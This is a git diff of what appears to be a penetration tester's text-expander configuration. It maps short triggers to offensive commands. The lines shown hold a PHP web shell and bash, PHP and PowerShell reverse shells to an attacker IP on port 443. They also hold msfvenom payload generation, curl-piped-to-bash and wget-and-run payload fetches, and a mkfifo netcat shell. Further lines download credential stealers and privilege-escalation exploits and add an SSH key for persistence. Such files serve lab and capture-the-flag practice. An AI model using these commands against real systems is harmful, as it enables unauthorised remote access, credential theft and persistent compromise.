@@ -14,30 +14,35 @@ global_vars:
     type: "shell"
     params:
       cmd: "cat /home/kali/.ssh/id_rsa.pub"
-# Entry 
-matches:
-  - trigger: ":nmap"
-    replace : sudo nmap -sC -sV -v -p- -o nmap --min-rate 
 
-  - trigger: ":setup"
-    replace : |
-      mkdir net && cd net 
+matches:
+# QOL
+  - trigger: ":ip"
+    replace: "{{IP}}"
+                  
+# SETUP AND NMAP              
+  - trigger: ":setup"                  
+    replace : |          
+      mkdir -p net && cd net         
       echo "<?php echo shell_exec(\$_GET['cmd']); ?>" > shell.php
       echo "<?php system(\"bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'\"); ?>" > rev.php
       echo "bash -c 'bash -i >& /dev/tcp/{{IP}}/443 0>&1'" > shell.sh
-      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230219/linpeas.sh -O lp.sh & 
-      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230219/winPEASany.exe -O wp.exe & 
+      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf &
+      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
+      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
+      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/linpeas.sh -O lp.sh & 
+      wget -q https://github.com/carlospolop/PEASS-ng/releases/download/20230924-10138da9/winPEASany.exe -O wp.exe & 
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 &
       wget -q https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy32 &
       wget -q https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip && unzip SharpHound-v1.1.0.zip &
       wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 &
       wget -q https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe &
-      wget -q https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/busybox_CHATTR -O chattr &
       wget -q https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe &
-      msfvenom -p linux/x86/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell86.elf &
-      msfvenom -p linux/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f elf -o shell64.elf &
-      msfvenom -p windows/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell86.exe &
-      msfvenom -p windows/x64/shell_reverse_tcp LHOST={{IP}} LPORT=443 -f exe -o shell64.exe &
+      wget -q https://github.com/ly4k/PwnKit/raw/main/PwnKit & 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz & 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz && tar -xzf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz &                                                                 
+      wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip && unzip -o ligolo-ng_agent_0.4.4_windows_amd64.zip  &                                                                  
       sudo python3 -m http.server 80
 
   - trigger: ":msfwin"
@@ -52,13 +57,52 @@ matches:
   - trigger: ":msfmlin"
     replace: msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=443 -f elf -o shell.elf LHOST=
 
-  - trigger: ":rev"
-    replace: curl http://{{IP}}/shell.sh | bash
+  - trigger: ":smb"
+    replace: "impacket-smbserver -smb2support share ."
+
+  - trigger: ":pyserver"
+    replace: "python3 -m http.sever "
+  
+  - trigger: ":phpserver"
+    replace: "php -S 0.0.0.0:"                                                  
+                                                                                
+  - trigger: ":responder"                                                       
+    replace: "sudo responder -I tun0"                                           
+                                                                                
+  - trigger: ":nc"                                                              
+    replace: |                                                                  
+      nc -nvlp 443                                                              
+                                                                                
+# ENUMERATION
+  - trigger: ":nmap"
+    replace: sudo nmap -sC -sV -v -p- -o nmap --min-rate 
+
+  - trigger: "lping"
+    replace: for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+
+  - trigger: "wping"
+    replace: for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+
+  - trigger: ":dirsearch"
+    replace: "dirsearch -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -e php,txt,html -f -u "
+
+# REVERSE SHELLS                                                                
+  # LINUX                                                                       
+  - trigger: ":rcurl"                                                           
+    replace: curl http://{{IP}}/shell.sh | bash                                 
+                                                                                
+  - trigger: ":rwget"                                                           
+    replace: wget http://192.168.174.150/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh                                                                        
+
+  - trigger: ":mkfifo"                                                          
+    replace: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} 443 >/tmp/f
     
-  - trigger: ":nc"
+  # WINDOWS
+  - trigger: ":rpowershell"
     replace: |
-      nc -nvlp 443
-# Post
+      $LHOST = "{{IP}}"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close() 
+
+# POST
   - trigger: ":pty"
     replace: |
       python3 -c 'import pty; pty.spawn("/bin/bash")' || python2 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")' || python2.7 -c 'import pty; pty.spawn("/bin/bash")' || python3.6 -c 'import pty; pty.spawn("/bin/bash")' || python3.5 -c 'import pty; pty.spawn("/bin/bash")' || script -qc /bin/bash /dev/null 
@@ -73,8 +117,8 @@ matches:
       stty rows 60 
       stty columns 150
       export TERM=screen
-
-  - trigger: ":persist"
+    
+  - trigger: ":sshpersist"
     replace: |
       mkdir -p ~/.ssh
       echo "{{ssh_key}}" >> ~/.ssh/authorized_keys
@@ -87,5 +131,11 @@ matches:
   
   - trigger: ":pligolo"
     replace: sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && ./proxy -selfcert 
+
   - trigger: ":aligolo"
     replace: ./agent.exe -connect {{IP}}:11601 -ignore-cert
+
+# EXPLOITS
+
+  - trigger: ":suid"
+    replace: find / -perm -u=s -type f 2>/dev/null
